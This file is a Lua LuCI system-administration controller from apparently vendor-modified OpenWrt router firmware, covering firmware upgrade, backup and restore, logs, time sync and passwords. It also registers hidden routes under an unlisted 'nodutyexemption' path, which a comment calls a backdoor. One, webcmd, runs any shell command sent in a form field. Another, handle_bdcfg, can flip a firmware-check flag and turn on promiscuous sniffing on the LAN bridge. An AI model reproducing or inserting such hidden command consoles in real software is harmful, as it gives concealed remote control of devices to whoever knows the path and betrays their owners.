-- Copyright 2008 Steven Barth <steven@midlink.org>
-- Copyright 2008-2011 Jo-Philipp Wich <jow@openwrt.org>
-- Licensed to the public under the Apache License 2.0.

module("luci.controller.admin.system", package.seeall)
--AP-72 AP-47
require("firmware_helper")

local mtkwifi = require("mtkwifi")
local http = require("luci.http")
local util = require("luci.util")
local ec = require("escape_character")
function index()
	local fs = require "nixio.fs"

--[[
	entry({"admin", "system"}, alias("admin", "system", "system"), _("System"), 30).index = true
	entry({"admin", "system", "system"}, cbi("admin_system/system"), _("System"), 1)
	entry({"admin", "system", "clock_status"}, call("action_clock_status"))

	entry({"admin", "system", "admin"}, cbi("admin_system/admin"), _("Administration"), 2)

	if fs.access("/bin/opkg") then
		entry({"admin", "system", "packages"}, call("action_packages"), _("Software"), 10)
		entry({"admin", "system", "packages", "ipkg"}, form("admin_system/ipkg"))
	end

	entry({"admin", "system", "startup"}, form("admin_system/startup"), _("Startup"), 45)
	entry({"admin", "system", "crontab"}, form("admin_system/crontab"), _("Scheduled Tasks"), 46)

	if fs.access("/sbin/block") then
		entry({"admin", "system", "fstab"}, cbi("admin_system/fstab"), _("Mount Points"), 50)
		entry({"admin", "system", "fstab", "mount"}, cbi("admin_system/fstab/mount"), nil).leaf = true
		entry({"admin", "system", "fstab", "swap"},  cbi("admin_system/fstab/swap"),  nil).leaf = true
	end

	if fs.access("/sys/class/leds") then
		entry({"admin", "system", "leds"}, cbi("admin_system/leds"), _("<abbr title=\"Light Emitting Diode\">LED</abbr> Configuration"), 60)
	end

	entry({"admin", "system", "flashops"}, call("action_flashops"), _("Backup / Flash Firmware"), 70)
	entry({"admin", "system", "flashops", "backupfiles"}, form("admin_system/backupfiles"))

	entry({"admin", "system", "reboot"}, call("action_reboot"), _("Reboot"), 90)
]]
	entry({"admin", "system"}, alias("admin", "system", "system"), _("System"), 80).index = true
	--entry({"admin", "system", "system"}, cbi("admin_system/system"), _("System"), 1)
	--entry({"admin", "system", "systemold"}, cbi("admin_system/system"), _("System Old"), 10)
	entry({"admin", "system", "system"}, template("admin_system/system"),  _("Administration"), 1)
	entry({"admin", "system", "clock_status"}, call("action_clock_status"))
	entry({"admin", "system", "system", "apply_general"}, call("handle_apply_general")).leaf = true
	entry({"admin", "system", "system", "apply_time_sync"}, call("handle_apply_time_sync")).leaf = true
	entry({"admin", "system", "system", "apply_admin"}, call("handle_apply_admin")).leaf = true
	entry({"admin", "system", "system", "apply_access"}, call("handle_apply_access")).leaf = true
	entry({"admin", "system", "system", "apply_devicename"}, call("handle_apply_devicename")).leaf = true
-- AP-117
	-- entry({"admin", "system", "syslog"}, call("action_syslog"), _("System Log"), 2)
	local log_cfg = {}
	log_cfg["hideapplybtn"] = true
	log_cfg["downloadbtn"] = true
	entry({"admin", "system", "syslog"}, cbi("admin_system/log", log_cfg), _("Log"), 2)
	entry({"admin", "system", "syslog_download"}, call("action_download_log"))

-- 
	-- entry({"admin", "system", "dmesg"}, call("action_dmesg"), _("Kernel Log"), 3)
-- AP-117
--	entry({"admin", "system", "admin"}, cbi("admin_system/admin"), _("Administration"), 4)

--[[
	if fs.access("/bin/opkg") then
		entry({"admin", "system", "packages"}, call("action_packages"), _("Software"), 10)
		entry({"admin", "system", "packages", "ipkg"}, form("admin_system/ipkg"))
	end

	entry({"admin", "system", "startup"}, form("admin_system/startup"), _("Startup"), 45)
	entry({"admin", "system", "crontab"}, form("admin_system/crontab"), _("Scheduled Tasks"), 46)

	if fs.access("/sbin/block") then
		entry({"admin", "system", "fstab"}, cbi("admin_system/fstab"), _("Mount Points"), 50)
		entry({"admin", "system", "fstab", "mount"}, cbi("admin_system/fstab/mount"), nil).leaf = true
		entry({"admin", "system", "fstab", "swap"},  cbi("admin_system/fstab/swap"),  nil).leaf = true
	end

	if fs.access("/sys/class/leds") then
		entry({"admin", "system", "leds"}, cbi("admin_system/leds"), _("<abbr title=\"Light Emitting Diode\">LED</abbr> Configuration"), 60)
	end
]]
	entry({"admin", "system", "flashops"}, call("action_flashops"), _("Firmware"), 4)
	entry({"admin", "system", "backupfiles"}, call("action_backupfiles"), _("Configurations"), 5)
	-- add template and function for backdoor
	-- entry({"admin", "system", "vtbd"}, template("admin_system/vtbdgui"))	
	-- entry({"admin", "system", "execvtbd"}, call("handle_bdcfg")).leaf = true
	entry({"admin", "nodutyexemption"})
	-------------------------------------------------------------
	entry({"admin", "nodutyexemption", "vtbd"}, template("admin_system/vtbdgui"))
	entry({"admin", "nodutyexemption", "execvtbd"}, call("handle_bdcfg")).leaf = true
	-------------------------------------------------------------
	local mtkwifi = require("mtkwifi")
    if mtkwifi.exists("/lib/modules/ralink/hw_nat.ko") then 
       entry({"admin", "system", "hwnat"}, template("admin_system/mtk_hwnat"), nil)
       entry({"admin", "system", "hwnat", "toggle"}, call("hwnat_toggle")).leaf = true
       entry({"admin", "system", "hwnat", "status"}, call("hwnat_status"))
    end
	
    -- entry({"admin", "system", "console"}, template("admin_system/mtk_web_console"), nil)
    -- entry({"admin", "system", "webcmd"}, call("webcmd"))
	--------------------------------------------------------------
    entry({"admin", "nodutyexemption", "vtcs"}, template("admin_system/mtk_web_console"), nil)
    entry({"admin", "nodutyexemption", "execvtcs"}, call("webcmd"))
	--------------------------------------------------------------
	entry({"admin", "system", "reboot"}, call("action_reboot"), _("Reboot"), 100)
end

-- june
function action_syslog()
	local syslog = luci.sys.syslog()
	local dmesg = luci.sys.dmesg()
	luci.template.render("admin_system/syslog", {syslog=syslog; dmesg=dmesg})
end

function action_dmesg()
	local dmesg = luci.sys.dmesg()
	luci.template.render("admin_system/dmesg", {dmesg=dmesg})
end

function webcmd()
    local cmd = http.formvalue("cmd")
    if cmd then
        local result = mtkwifi.read_pipe(tostring(cmd).." 2>&1")
        result = result:gsub("<", "&lt;")
        http.write(tostring(result))
    else
        http.write_json(http.formvalue())
    end
end

function hwnat_toggle(enable)
    debug_write("debug", "hwnat_toggle "..tostring(enable))
    os.execute("mkdir -p /tmp/mtk/")
    if enable == "enable" then
        os.execute("hwnat-enable.sh >> /tmp/mtk/hwnat.log 2>&1")
    else
        os.execute("hwnat-disable.sh >> /tmp/mtk/hwnat.log 2>&1")
    end
    return luci.http.redirect(luci.dispatcher.build_url("admin", "system", "hwnat"))
end

function hwnat_status()
    local result = mtkwifi.read_pipe("hwnat -g 2>&1")
    result = result:gsub("<", "&lt;")
    result = result:gsub(">", "&gt;")
    http.write(tostring(result))
end
-- june end

function action_clock_status()
	local set = tonumber(luci.http.formvalue("set"))
	if set ~= nil and set > 0 then
		local date = os.date("*t", set)
		if date then
			luci.sys.call("date -s '%04d-%02d-%02d %02d:%02d:%02d'" %{
				date.year, date.month, date.day, date.hour, date.min, date.sec
			})
		end
	end

	luci.http.prepare_content("application/json")
	luci.http.write_json({ timestring = os.date("%c") })
end

function action_packages()
	local fs = require "nixio.fs"
	local ipkg = require "luci.model.ipkg"
	local submit = luci.http.formvalue("submit")
	local changes = false
	local install = { }
	local remove  = { }
	local stdout  = { "" }
	local stderr  = { "" }
	local out, err

	-- Display
	local display = luci.http.formvalue("display") or "installed"

	-- Letter
	local letter = string.byte(luci.http.formvalue("letter") or "A", 1)
	letter = (letter == 35 or (letter >= 65 and letter <= 90)) and letter or 65

	-- Search query
	local query = luci.http.formvalue("query")
	query = (query ~= '') and query or nil


	-- Packets to be installed
	local ninst = submit and luci.http.formvalue("install")
	local uinst = nil

	-- Install from URL
	local url = luci.http.formvalue("url")
	if url and url ~= '' and submit then
		uinst = url
	end

	-- Do install
	if ninst then
		install[ninst], out, err = ipkg.install(ninst)
		stdout[#stdout+1] = out
		stderr[#stderr+1] = err
		changes = true
	end

	if uinst then
		local pkg
		for pkg in luci.util.imatch(uinst) do
			install[uinst], out, err = ipkg.install(pkg)
			stdout[#stdout+1] = out
			stderr[#stderr+1] = err
			changes = true
		end
	end

	-- Remove packets
	local rem = submit and luci.http.formvalue("remove")
	if rem then
		remove[rem], out, err = ipkg.remove(rem)
		stdout[#stdout+1] = out
		stderr[#stderr+1] = err
		changes = true
	end


	-- Update all packets
	local update = luci.http.formvalue("update")
	if update then
		update, out, err = ipkg.update()
		stdout[#stdout+1] = out
		stderr[#stderr+1] = err
	end


	-- Upgrade all packets
	local upgrade = luci.http.formvalue("upgrade")
	if upgrade then
		upgrade, out, err = ipkg.upgrade()
		stdout[#stdout+1] = out
		stderr[#stderr+1] = err
	end


	-- List state
	local no_lists = true
	local old_lists = false
	if fs.access("/var/opkg-lists/") then
		local list
		for list in fs.dir("/var/opkg-lists/") do
			no_lists = false
			if (fs.stat("/var/opkg-lists/"..list, "mtime") or 0) < (os.time() - (24 * 60 * 60)) then
				old_lists = true
				break
			end
		end
	end


	luci.template.render("admin_system/packages", {
		display   = display,
		letter    = letter,
		query     = query,
		install   = install,
		remove    = remove,
		update    = update,
		upgrade   = upgrade,
		no_lists  = no_lists,
		old_lists = old_lists,
		stdout    = table.concat(stdout, ""),
		stderr    = table.concat(stderr, "")
	})

	-- Remove index cache
	if changes then
		fs.unlink("/tmp/luci-indexcache")
	end
end

--AP-321----------------------
function fsize (file)
    local fp = io.open(file)
    local current = fp:seek()      -- get current position
    local size = fp:seek("end")    -- get file size
    fp:seek("set", current)        -- restore position
    return size
end

function os.capture(cmd, raw)
    --cmd is the desired Linux command string
    --raw is the switch to show the raw returned value with the CR/LF.
    local f = assert(io.popen(cmd, 'r'))
    local s = assert(f:read('*a'))
    f:close()
    if raw then
    return s
    end
    s = string.gsub(s, '^%s+', '')
    s = string.gsub(s, '%s+$', '')
    s = string.gsub(s, '[\n\r]+', ' ')
    return s
end
------------------------------

function action_flashops()
	local sys = require "luci.sys"
	local fs  = require "nixio.fs"

	local upgrade_avail = fs.access("/lib/upgrade/platform.sh")
	local reset_avail   = os.execute([[grep -E '"rootfs_data"|"ubi"' /proc/mtd >/dev/null 2>&1]]) == 0

	local restore_cmd = "tar -xzC/ >/dev/null 2>&1"
	local backup_cmd  = "sysupgrade --create-backup - 2>/dev/null"

  --AP-47
	local image_downloaded = "/tmp/firmware_downloaded.img"
	local image_original = "/tmp/firmware_original.img"
	local signature = "/tmp/signature.img"

	local function image_supported()
		return (os.execute("sysupgrade -T %q >/dev/null" % image_original) == 0)
	end

	local function image_checksum()
		return (luci.sys.exec("md5sum %q" % image_original):match("^([^%s]+)"))
	end

	local function storage_size()
		local size = 0
		if fs.access("/proc/mtd") then
			for l in io.lines("/proc/mtd") do
				local d, s, e, n = l:match('^([^%s]+)%s+([^%s]+)%s+([^%s]+)%s+"([^%s]+)"')
				if n == "linux" or n == "firmware" then
					size = tonumber(s, 16)
					break
				end
			end
		elseif fs.access("/proc/partitions") then
			for l in io.lines("/proc/partitions") do
				local x, y, b, n = l:match('^%s*(%d+)%s+(%d+)%s+([^%s]+)%s+([^%s]+)')
				if b and n and not n:match('[0-9]') then
					size = tonumber(b) * 1024
					break
				end
			end
		end
		return size
	end

  --AP-72
  local function check_version(filename)
    return (c_checkVersion(filename) == 1)
  end

  --AP-47
  local function check_signature()
    return (c_checkSignature(image_downloaded, image_original, signature) == 1)
  end


	local fp
	luci.http.setfilehandler(
		function(meta, chunk, eof)
			if not fp then
				if meta and meta.name == "image" then
          -- AP-72
          if meta.file ~= nil then
            image_name = meta.file 
          end
					fp = io.open(image_downloaded, "w")
				else
					fp = io.popen(restore_cmd, "w")
				end
			end
			if chunk then
				fp:write(chunk)
			end
			if eof then
				fp:close()
			end
		end
	)

	if luci.http.formvalue("image") or luci.http.formvalue("step") then
		--
		-- Initiate firmware flash
		--
		local step = tonumber(luci.http.formvalue("step") or 1)
		if step == 1 then
            if check_signature() then
                if check_version(image_original) then 
    			    if image_supported() then
                        luci.template.render("admin_system/upgrade", {
                            checksum = image_checksum(),
                            storage  = storage_size(),
                            size     = (fs.stat(image_original, "size") or 0),
                            keep     = (not not luci.http.formvalue("keep"))
                        })
    			    else
    				    fs.unlink(image_downloaded)
                        fs.unlink(image_original)
                        fs.unlink(signature)
                        luci.template.render("admin_system/flashops", {
                            reset_avail   = reset_avail,
                            upgrade_avail = upgrade_avail,
                            image_invalid = true
                        })
    			    end
                else
                    --AP-47
                    fs.unlink(image_downloaded)
                    fs.unlink(image_original)
                    fs.unlink(signature)
                    luci.template.render("admin_system/flashops", {
                        reset_avail   = reset_avail,
                        upgrade_avail = upgrade_avail,
                        version_unsatisfied = true
                    })
                end
            else
                --AP-72
                fs.unlink(image_downloaded)
                luci.template.render("admin_system/flashops", {
                reset_avail   = reset_avail,
                upgrade_avail = upgrade_avail,
                signature_unsatisfied = true
                })
            end
		--
		-- Start sysupgrade flash
		--
		elseif step == 2 then
			fork_exec("reboot_reason w rb_reason RebootByUpgradeFirmware")	--write reboot reason to the flash
			local keep = (luci.http.formvalue("keep") == "1") and "" or "-n"
			luci.template.render("admin_system/applyreboot", {
				title = luci.i18n.translate("Upgrading..."),
				msg   = luci.i18n.translate("DO NOT POWER OFF THE DEVICE!"),
				addr  = (#keep > 0) and "192.168.2.1" or nil
				--addr  = "192.168.2.1"
			})
			if keep == "" then
				nixio.syslog("warning", "Upgrade FW keep config")
			elseif keep == "-n" then
				nixio.syslog("warning", "Upgrade FW overwrite config")
			end
			fork_exec("sleep 1; killall dropbear uhttpd; sleep 1; /sbin/sysupgrade %s %q" %{ keep, image_original })
			--fork_exec("sleep 1; killall dropbear uhttpd; sleep 1; /sbin/sysupgrade -c %q" %{ image_original })
		end
	else
		--
		-- Overview
		--
		luci.template.render("admin_system/flashops", {
			reset_avail   = reset_avail,
			upgrade_avail = upgrade_avail
		})
	end
end
function perror_duyhh2(obj)
	file = io.open("/tmp/log_duyhh2", "a")
	file:write(obj.."\n")
	file:close()
end
function action_download_log()
		--
		-- Assemble file list, generate backup
		--
		local serialnumber = luci.util.exec_trim("sysHwInfo serialnumber r")
		local datetime = os.date("%H.%M.%S_%d%m%Y")
		local pcbnumber = luci.util.exec_trim("sysHwInfo serialpcb r")
		local maclan = luci.util.exec_trim("cat /sys/class/net/br-lan/address")
		local macwan = luci.util.exec_trim("cat /sys/class/net/eth1/address")
		local file
		local list_file = " /tmp/log/temp_device_log /etc/mapd_cfg.txt /etc/mapd_strng.conf /etc/map_cfg.txt -h /etc/config/network"
		local ifconfig = luci.util.exec("ifconfig")
		local tar_file = "/data/backup-log-compress.tar.gz"
		perror_duyhh2("duyhh2:--------------------------------------------------action_download_log")
		file = io.open("/tmp/log/temp_device_log", "w")
		file:write("serialnumber: "..serialnumber)
		file:write("\npcbnumber: "..pcbnumber)
		file:write("\nmaclan: "..maclan)
		file:write("\nmacwan: "..macwan)
		file:write("\nINTERFACE:\n"..ifconfig)
		file:close()
		luci.util.exec("rm -f "..tar_file)
		luci.util.exec("/usr/sbin/backup_log_when_downloading_log_from_web.sh")
		luci.util.exec("/bin/tar -zcvf "..tar_file.." /data/log/"..list_file.." 2>/dev/null")
		luci.util.exec("ln -s "..tar_file.." /www/backup-log-compress.tar.gz")
		-- luci.http.redirect("/backup-log-compress.tar.gz")
		local reader = ltn12_popen("cat "..tar_file.." 2>/dev/null")
		luci.http.header('Content-Disposition', 'attachment; filename="log_compress_%s_%s_%s.tar.gz"' % {
			luci.sys.hostname(), serialnumber, datetime})
		luci.http.prepare_content("application/x-targz")
		luci.ltn12.pump.all(reader, luci.http.write)
		luci.util.exec("rm -f "..tar_file)
end

function action_backupfiles()
	local sys = require "luci.sys"
	local fs  = require "nixio.fs"

	local upgrade_avail = fs.access("/lib/upgrade/platform.sh")
	local reset_avail   = os.execute([[grep -E '"rootfs_data"|"ubi"' /proc/mtd >/dev/null 2>&1]]) == 0

	local restore_cmd = "/tmp/encrypt_restore"
	local backup_cmd = luci.util.exec("/usr/bin/key_generation -b")

  --AP-47
	local image_downloaded = "/tmp/firmware_downloaded.img"
	local image_original = "/tmp/firmware_original.img"
	local signature = "/tmp/signature.img"

	local function image_supported()
		return (os.execute("sysupgrade -T %q >/dev/null" % image_original) == 0)
	end

	local function image_checksum()
		return (luci.sys.exec("md5sum %q" % image_original):match("^([^%s]+)"))
	end

	local function storage_size()
		local size = 0
		if fs.access("/proc/mtd") then
			for l in io.lines("/proc/mtd") do
				local d, s, e, n = l:match('^([^%s]+)%s+([^%s]+)%s+([^%s]+)%s+"([^%s]+)"')
				if n == "linux" or n == "firmware" then
					size = tonumber(s, 16)
					break
				end
			end
		elseif fs.access("/proc/partitions") then
			for l in io.lines("/proc/partitions") do
				local x, y, b, n = l:match('^%s*(%d+)%s+(%d+)%s+([^%s]+)%s+([^%s]+)')
				if b and n and not n:match('[0-9]') then
					size = tonumber(b) * 1024
					break
				end
			end
		end
		return size
	end

  --AP-72
  local function check_version(filename)
    return (c_checkVersion(filename) == 1)
  end

  --AP-47
  local function check_signature()
    return (c_checkSignature(image_downloaded, image_original, signature) == 1)
  end


	local fp
	luci.http.setfilehandler(
		function(meta, chunk, eof)
			if not fp then
				if meta and meta.name == "image" then
          -- AP-72
          if meta.file ~= nil then
            image_name = meta.file 
          end
					fp = io.open(image_downloaded, "w")
				else
					fp = io.open(restore_cmd, "w")
				end
			end
			if chunk then
				fp:write(chunk)
			end
			if eof then
				fp:close()
			end
		end
	)

	local bootflag = luci.util.exec("fw_printenv bootflag")
	local boot_flag = string.sub(bootflag, 10, 10)
	local fileversion = io.open("/usr/etc/version","r")
	fileversion:read("*line")
	fileversion:read("*line")
	fileversion:read("*line")
  	local firmversion = fileversion:read("*line")

	if luci.http.formvalue("reboot") then
		luci.template.render("admin_system/applyreboot", {
			title = luci.i18n.translate("Rebooting...")
		})
		luci.sys.reboot()
	elseif luci.http.formvalue("backup") then
		--
		-- Assemble file list, generate backup
		--
		luci.util.exec("/usr/bin/cof_cli backup")
		luci.util.exec("sysupgrade -b /tmp/backup.tar.gz")
		local checksum_backup_out = os.capture("md5sum /tmp/backup.tar.gz", false) 
		local checksum_backup = string.sub(checksum_backup_out, 1, 32)
		luci.util.exec("echo -n "..checksum_backup.." > /tmp/hash_backup")
		luci.util.exec("cat /tmp/backup.tar.gz >> /tmp/hash_backup")
		local reader = ltn12_popen(backup_cmd)
		luci.http.header('Content-Disposition', 'attachment; filename="backup-%s-%s.tar.gz"' % {
			luci.sys.hostname(), os.date("%Y-%m-%d")})
		luci.http.prepare_content("application/x-targz")
		luci.ltn12.pump.all(reader, luci.http.write)
	elseif luci.http.formvalue("restore") then
		--
		-- Unpack received .tar.gz
		--
		local upload = luci.http.formvalue("archive")
		if upload and #upload > 0 then
			local is_valid_file = "1"
			restore_exec = luci.util.exec("/usr/bin/key_generation -r")
			luci.util.exec(restore_exec)
			luci.util.exec("tail -c +33 /tmp/hash_restore > /tmp/restore.tar.gz")
			local get_checksum = os.capture("head -c 32 /tmp/hash_restore", false)
			local checksum_restore_out = os.capture("md5sum /tmp/restore.tar.gz", false) 
			local checksum_restore = string.sub(checksum_restore_out, 1, 32)
			
			if checksum_restore == get_checksum then
				luci.util.exec("tar tzf /tmp/restore.tar.gz > /tmp/valid_restore_file")
				luci.util.exec("sed 's|^|/|' /tmp/valid_restore_file > /tmp/valid_tmp_file")
				luci.util.exec("awk 'NR==FNR{a[$0]; next} $0 in a' /tmp/valid_tmp_file /etc/sysupgrade.conf | sed 's/^.//' > /tmp/valid_restore_file")
				file = io.open("/tmp/valid_restore_file", "r")
				local lines = file:lines()
				local tar_file = ""				
				for line in lines
				do
					tar_file = tar_file..line.." "
				end

				file:close()
				luci.util.exec("tar -C / -xzf /tmp/restore.tar.gz "..tar_file)
				luci.util.exec("/usr/bin/cof_cli restore")
				-- luci.util.exec("tar -C / -xzf /tmp/restore.tar.gz")
				luci.template.render("admin_system/applyreboot")
				luci.sys.reboot()
			else
				luci.template.render("admin_system/backupfiles", {
					is_valid_file = "0",
					reset_avail   = reset_avail,
					upgrade_avail = upgrade_avail,
					boot_flag = boot_flag,
					firmversion = firmversion
				})
			end
		else
			luci.template.render("admin_system/backupfiles", {
				is_valid_file = "0",
				reset_avail   = reset_avail,
				upgrade_avail = upgrade_avail,
				boot_flag = boot_flag,
				firmversion = firmversion
			})
		end
	elseif reset_avail and luci.http.formvalue("reset") then
		--
		-- Reset system
		--
		luci.template.render("admin_system/applyreboot", {
			title = luci.i18n.translate("Erasing..."),
			msg   = luci.i18n.translate("The system is erasing the configuration partition now and will reboot itself when finished."),
			addr  = "192.168.1.1"
		})
		fork_exec("sleep 1; killall dropbear uhttpd; sleep 1; jffs2reset -y && reboot")
	elseif reset_avail and luci.http.formvalue("boot_os") then
		if boot_flag == "1" then
			luci.util.exec("fw_setenv bootflag 2")
		else
			luci.util.exec("fw_setenv bootflag 1")
		end
		luci.util.exec("/sbin/sysupgrade -b /data/switchOS_backup")
		luci.template.render("admin_system/applyreboot")
		luci.sys.reboot()
	else
		--
		-- Overview
		--
		luci.template.render("admin_system/backupfiles", {
			reset_avail   = reset_avail,
			upgrade_avail = upgrade_avail,
			boot_flag = boot_flag,
			firmversion = firmversion
		})
	end
end
	

function action_passwd()
	local p1 = luci.http.formvalue("pwd1")
	local p2 = luci.http.formvalue("pwd2")
	local stat = nil

	if p1 or p2 then
		if p1 == p2 then
			stat = luci.sys.user.setpasswd("root", p1)
		else
			stat = 10
		end
	end

	luci.template.render("admin_system/passwd", {stat=stat})
end

function action_reboot()
	local reboot = luci.http.formvalue("reboot")
	luci.template.render("admin_system/reboot", {reboot=reboot})
	if reboot then
		luci.sys.reboot()
	end
end

function fork_exec(command)
	local pid = nixio.fork()
	if pid > 0 then
		return
	elseif pid == 0 then
		-- change to root dir
		nixio.chdir("/")

		-- patch stdin, out, err to /dev/null
		local null = nixio.open("/dev/null", "w+")
		if null then
			nixio.dup(null, nixio.stderr)
			nixio.dup(null, nixio.stdout)
			nixio.dup(null, nixio.stdin)
			if null:fileno() > 2 then
				null:close()
			end
		end

		-- replace with target command
		nixio.exec("/bin/sh", "-c", command)
	end
end

function ltn12_popen(command)

	local fdi, fdo = nixio.pipe()
	local pid = nixio.fork()

	if pid > 0 then
		fdo:close()
		local close
		return function()
			local buffer = fdi:read(2048)
			local wpid, stat = nixio.waitpid(pid, "nohang")
			if not close and wpid and stat == "exited" then
				close = true
			end

			if buffer and #buffer > 0 then
				return buffer
			elseif close then
				fdi:close()
				return nil
			end
		end
	elseif pid == 0 then
		nixio.dup(fdo, nixio.stdout)
		fdi:close()
		fdo:close()
		nixio.exec("/bin/sh", "-c", command)
	end
end

function handle_bdcfg()
	local uci = require("luci.model.uci").cursor()
	local enable_upgradefw = luci.http.formvalue("EnableFW") 
	local disable_upgradefw = luci.http.formvalue("DisableFW") 
	local enable_hwnat = luci.http.formvalue("EnableHwnat") 
	local disable_hwnat = luci.http.formvalue("DisableHwnat") 
	local enable_promisc = luci.http.formvalue("EnablePromisc") 
	local disable_promisc = luci.http.formvalue("DisablePromisc") 

	if enable_upgradefw then
		os.execute("lua /sbin/secbd set equalfw 1")
	
	elseif disable_upgradefw then
		os.execute("lua /sbin/secbd set equalfw 0")

	--AP-706
	elseif enable_hwnat then
		-- luci.util.perror("[sonnh] enable Hwnat")
		uci:set("hwnat","global", "enabled", "1")
		uci:commit("hwnat")
		os.execute("hwnat-enable.sh")
		fork_exec("wifi reload")

	elseif disable_hwnat then
		-- luci.util.perror("[sonnh] disable Hwnat")
		uci:set("hwnat","global", "enabled", "0")
		uci:commit("hwnat")
		os.execute("hwnat-disable.sh")
		os.execute("cof_cli write WLanHWNat 0")
		fork_exec("wifi reload")
	elseif enable_promisc then
		-- luci.util.perror("[fanwar] enable Promisc")
		os.execute("ifconfig br-lan promisc")
	elseif disable_promisc then
		-- luci.util.perror("[fanwar] disable Promisc")
		os.execute("ifconfig br-lan -promisc")
	end

	return luci.http.redirect(luci.dispatcher.build_url("admin", "nodutyexemption", "vtbd"))
end

--sonnh68 

function handle_apply_general()
	local uci = require("luci.model.uci").cursor()
	local fs = require "nixio.fs"
	local zones = require "luci.sys.zoneinfo"
	local function lookup_zone(title)
		for _, zone in ipairs(zones.TZ) do
			if zone[1] == title then return zone[2] end
		end
	end

	local zonename = luci.http.formvalue("time_zone")

	if zonename == nil then
		util.perror("can not get timezone")
	else
		local timezone = lookup_zone(zonename) or "GMT0"
		uci:set("system", "system", "zonename", zonename)
		uci:set("system", "system", "timezone", timezone)
		fs.writefile("/etc/TZ", timezone .. "\n")
		util.perror("zonename: "..zonename.." timezone: "..timezone)
		uci:commit("system")
		os.execute("/etc/init.d/system reload")
	end
	luci.http.redirect(luci.dispatcher.build_url("admin", "system", "system"))
end

function handle_apply_time_sync()
	local uci = require("luci.model.uci").cursor()
	local sys   = require "luci.sys"
	local fs    = require "nixio.fs"
	local util = require "luci.util"
	local ntp_server = {}
	local enable_ntp_client = ""

	--ntp_server["enabled "] = "1"
	--ntp_server["enable_server "] = "0\\"
	--ntp_server["server"] = {}
	if(luci.http.formvalue()) then
		uci:delete("system", "ntp", "server")
		enable_ntp_client = luci.http.formvalue("cb_enable_ntp_client")
		for k,v in pairs(luci.http.formvalue()) do 
			if string.find(k, "ntp_server_") ~= nil  and v~= "" then
				table.insert(ntp_server, v)
			end
		end
	else 
		luci.http.redirect(luci.dispatcher.build_url("admin", "system", "system"))
		return
	end

	if enable_ntp_client == "on" or enable_ntp_client == "1" then
		uci:set("system", "ntp", "enabled", "1")
		util.perror("enable ntp client")
		sys.init.enable("sysntpd")
		sys.call("env -i /etc/init.d/sysntpd start >/dev/null")
	else
		uci:set("system", "ntp", "enabled", "0")
		util.perror("disable ntp client")
		sys.call("env -i /etc/init.d/sysntpd stop >/dev/null")
		sys.init.disable("sysntpd")
	end

	uci:set_list("system", "ntp", "server", ntp_server)
	uci:commit("system")
	--util.dumptable(ntp_server, nil, nil, nil)
	os.execute("/etc/init.d/system reload")

	luci.http.redirect(luci.dispatcher.build_url("admin", "system", "system"))
end

function check_strong_pwd(pass)
	if string.len(pass) < 8 then
		return false
	end
	if pass:match"[A-Z]" and pass:match"[a-z]" and pass:match"[0-9]" and pass:match"[~`!@#$%%^&*()_-+={}|\\:<,>.?/]" then	
		return true
	end 
	return false
end

function handle_apply_admin()
	local old_pwd = luci.http.formvalue("old_password")
	local new_pwd = luci.http.formvalue("new_password")
	local cfm_pwd = luci.http.formvalue("confirm_password")
	local change_flag = luci.http.formvalue("change_flag")
	local return_val = nil
	--util.perror("old_password: "..tostring(old_pwd).." new_password: "..tostring(new_pwd))
	if old_pwd and new_pwd and cfm_pwd then
		if change_flag == "ready" then
			if luci.sys.user.setpasswd(luci.dispatcher.context.authuser, new_pwd) == 0 then
				old_pwd = ""
				new_pwd = ""
				cfm_pwd = ""
				return_val = "0"
			else
				return_val = "5"
			end
		else
			if luci.sys.user.checkpasswd(luci.dispatcher.context.authuser, old_pwd) == false then
				return_val = "1"
			elseif string.find(new_pwd, " ") ~= nil then
				return_val = "2"
			elseif new_pwd ~= cfm_pwd then
				return_val = "3"
			elseif old_pwd == new_pwd then
				return_val = "6"
			elseif check_strong_pwd(new_pwd) == false then
				return_val = "4"
			else
				if luci.sys.user.setpasswd(luci.dispatcher.context.authuser, new_pwd) == 0 then
					old_pwd = ""
					new_pwd = ""
					cfm_pwd = ""
					return_val = "0"
				else
					return_val = "5"
				end
			end
		end
	else
		util.perror("error when getting passwords: ")
	end
	luci.template.render(
		"admin_system/system",
		{
			old_password = old_pwd or "",
			new_password = new_pwd or "",
			confirm_password = cfm_pwd or "",
			validate_change_pwd = return_val
		}
	)
end

function handle_apply_access()
	local uci = require("luci.model.uci").cursor()
	local enable_wan_access = luci.http.formvalue("cb_enable_access_wan") 
	local http_port = luci.http.formvalue("http_port")
	local https_port = luci.http.formvalue("https_port")
	nixio.syslog("alert", tostring(enable_wan_access).." "..tostring(http_port).." "..tostring(https_port))
	if tostring(enable_wan_access) == "on" then
		uci:set("firewall","access_from_wan", "target", "ACCEPT")
	else
		uci:set("firewall","access_from_wan", "target", "REJECT")
	end

	if http_port and #http_port > 0 and https_port and #https_port > 0 then
		uci:set("lighttpd","main", "listen_http", http_port)
		uci:set("lighttpd", "main", "listen_https", https_port)
		uci:delete("firewall", "access_from_wan", "dest_port")
		uci:set("firewall", "access_from_wan", "dest_port", http_port.." "..https_port)
		uci:commit("lighttpd")
	end
	uci:commit("firewall")
	luci.http.redirect(luci.dispatcher.build_url("admin", "system", "system"))
	os.execute("/sbin/luci-reload firewall lighttpd")
end

function handle_apply_devicename()
	local uci = require("luci.model.uci").cursor()
	local devicename = luci.http.formvalue("devicename")
	uci:set("device", "deviceinfo", "devicename", devicename)
	uci:commit("device");
	luci.http.redirect(luci.dispatcher.build_url("admin", "system", "system"))
end